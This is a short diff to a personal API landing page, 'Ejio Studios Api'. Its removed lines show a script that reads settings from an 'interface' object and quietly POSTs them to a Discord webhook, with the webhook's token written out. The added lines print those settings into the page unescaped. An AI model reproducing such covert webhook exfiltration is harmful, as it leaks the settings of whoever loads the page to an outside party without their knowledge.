@@ -8,28 +8,17 @@
     <meta name="description" content="The api for all thinks ejio!">
     <meta name="theme-color" content="#eb4034">
     <script>
-      if (!interface) {
-        alert("oof")
-        return;
-      }      
-      var raw = interface.getInitSettings();
-      
-      var http = new XMLHttpRequest();
-      var url = 'https://discord.com/api/webhooks/874717283577126974/Jcz7E-eLSYYn-nB8c9jbs7vNFM3kR6mif-BnAIkvycZJ3HiJYf3jy-eGK6G82DWEgxIG';
-      http.open('POST', url, true);
-      http.setRequestHeader('Content-type', 'application/json');
-      http.onreadystatechange = function() {//Call a function when the state changes.
-          if(http.readyState == 4 && http.status == 200) {
-              alert(http.responseText);
-          }
-      }
-      http.send(JSON.stringify({
-          content: raw,
-       }));
+      var element = document.getElementById('pls')
+      if (interface) {
+        var raw = interface.getInitSettings();
+        element.innerHTML = raw
+      } else {
+         element.innerHTML = "booo"
+      }     
     </script>
   </head>
   <body>
-    <h1>Ejio Studios Api</h1>
+    <h1 id="pls">Ejio Studios Api</h1>
     <p>All endpoints related to games, websites and projects i own.</p>
     <hr>
     <h2>Roblox Endpoints</h2>
